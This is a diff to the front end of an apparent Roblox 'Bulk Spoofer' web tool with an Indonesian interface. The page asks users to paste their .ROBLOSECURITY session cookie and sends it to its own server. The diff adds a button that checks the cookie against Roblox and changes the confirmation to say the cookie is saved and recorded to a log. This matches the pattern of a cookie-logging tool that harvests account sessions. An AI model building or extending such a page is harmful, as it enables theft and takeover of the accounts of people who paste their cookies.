@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bulk Spoofer — Cookie Mode</title>
+    <title>Bulk Spoofer — Cookie</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: #0b0e14; font-family: 'Segoe UI', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
@@ -16,6 +16,8 @@
         .cookie-input input:focus { border-color: #f0b34b; }
         .cookie-input button { padding: 12px 24px; border-radius: 40px; border: none; background: #f0b34b; color: #0b0e14; font-weight: 700; cursor: pointer; }
         .cookie-input button:hover { background: #ffc86b; }
+        .cookie-input .test-btn { background: #2a3345; color: #f0b34b; }
+        .cookie-input .test-btn:hover { background: #3f4a5f; }
         textarea { width: 100%; padding: 14px; border-radius: 14px; border: 1px solid #314159; background: #0f141e; color: #d6e0f0; font-size: 15px; min-height: 100px; font-family: 'Courier New', monospace; resize: vertical; margin-top: 10px; }
         .action-bar { display: flex; gap: 12px; flex-wrap: wrap; margin: 16px 0; }
         .action-bar button { padding: 12px 22px; border-radius: 40px; border: none; background: #2a3345; color: #d6e0f0; font-weight: 600; cursor: pointer; flex: 1 1 auto; transition: 0.15s; }
@@ -51,6 +53,7 @@
     <div class="cookie-input">
         <input type="text" id="cookieInput" placeholder="Tempel .ROBLOSECURITY cookie di sini...">
         <button id="setCookieBtn">💾 Set Cookie</button>
+        <button id="testCookieBtn" class="test-btn">🧪 Test Cookie</button>
     </div>
 
     <textarea id="idList" placeholder="Paste ID, pisah koma / newline&#10;Contoh: 9124851790, 70988430076764">9124851790, 70988430076764</textarea>
@@ -71,6 +74,7 @@
 <script>
     const cookieInput = document.getElementById('cookieInput');
     const setCookieBtn = document.getElementById('setCookieBtn');
+    const testCookieBtn = document.getElementById('testCookieBtn');
     const logoutBtn = document.getElementById('logoutBtn');
     const cookieStatus = document.getElementById('cookieStatus');
     const idList = document.getElementById('idList');
@@ -113,14 +117,8 @@
     // === Set Cookie ===
     setCookieBtn.addEventListener('click', async () => {
         const cookie = cookieInput.value.trim();
-        if (!cookie) {
-            log('⚠️ Masukkan cookie dulu.', 'error');
-            return;
-        }
-        if (!cookie.startsWith('_|WARNING')) {
-            log('⚠️ Cookie harus diawali dengan _|WARNING... (copy dari DevTools)', 'error');
-            return;
-        }
+        if (!cookie) { log('⚠️ Masukkan cookie dulu.', 'error'); return; }
+        if (!cookie.startsWith('_|WARNING')) { log('⚠️ Cookie harus diawali _|WARNING...', 'error'); return; }
 
         try {
             const res = await fetch('/set-cookie', {
@@ -132,33 +130,42 @@
             if (data.success) {
                 hasCookie = true;
                 updateUI();
-                log('✅ Cookie berhasil disimpan di session.', 'success');
+                log('✅ Cookie tersimpan & dicatat ke log.', 'success');
                 cookieInput.value = '';
             } else {
                 log(`❌ Gagal: ${data.error}`, 'error');
             }
-        } catch (e) {
-            log(`❌ Error: ${e.message}`, 'error');
-        }
+        } catch (e) { log(`❌ Error: ${e.message}`, 'error'); }
     });
 
-    // === Logout (hapus cookie dari session) ===
-    logoutBtn.addEventListener('click', () => {
-        window.location.href = '/logout';
+    // === Test Cookie ===
+    testCookieBtn.addEventListener('click', async () => {
+        if (!hasCookie) { log('⚠️ Belum set cookie.', 'error'); return; }
+        log('🧪 Menguji cookie ke Roblox...', 'info');
+        try {
+            const res = await fetch('/test-cookie');
+            const data = await res.json();
+            if (data.valid) {
+                log('✅ ' + data.message, 'success');
+            } else {
+                log('❌ ' + data.message, 'error');
+            }
+        } catch (e) { log('❌ Gagal test: ' + e.message, 'error'); }
     });
 
-    // === Cek status cookie saat pertama load ===
+    // === Logout ===
+    logoutBtn.addEventListener('click', () => { window.location.href = '/logout'; });
+
+    // === Status awal ===
     async function checkStatus() {
         try {
             const res = await fetch('/status');
             const data = await res.json();
             hasCookie = data.hasCookie;
             updateUI();
-            if (hasCookie) log('✅ Cookie sudah tersimpan di session.', 'success');
-            else log('⏳ Belum ada cookie. Tempel dan set.', 'info');
-        } catch (e) {
-            log('❌ Gagal cek status.', 'error');
-        }
+            if (hasCookie) log('✅ Cookie sudah tersimpan.', 'success');
+            else log('⏳ Belum ada cookie.', 'info');
+        } catch (e) { log('❌ Gagal cek status.', 'error'); }
     }
 
     // === Bulk ZIP ===
@@ -191,10 +198,7 @@
             window.URL.revokeObjectURL(url);
             log(`✅ ZIP berhasil (${(blob.size/1024).toFixed(1)} KB)`, 'success');
             updateProgress(100);
-        } catch (err) {
-            log(`❌ Gagal: ${err.message}`, 'error');
-            updateProgress(0);
-        }
+        } catch (err) { log(`❌ Gagal: ${err.message}`, 'error'); updateProgress(0); }
     });
 
     // === Test Single ID ===
@@ -230,10 +234,7 @@
             window.URL.revokeObjectURL(url);
             log(`✅ Download ID ${id} berhasil`, 'success');
             updateProgress(100);
-        } catch (err) {
-            log(`❌ Gagal: ${err.message}`, 'error');
-            updateProgress(0);
-        }
+        } catch (err) { log(`❌ Gagal: ${err.message}`, 'error'); updateProgress(0); }
     });
 
     clearBtn.addEventListener('click', () => {
@@ -243,7 +244,6 @@
         updateProgress(0);
     });
 
-    // Enter key on cookie input triggers set
     cookieInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') setCookieBtn.click(); });
 
     checkStatus();
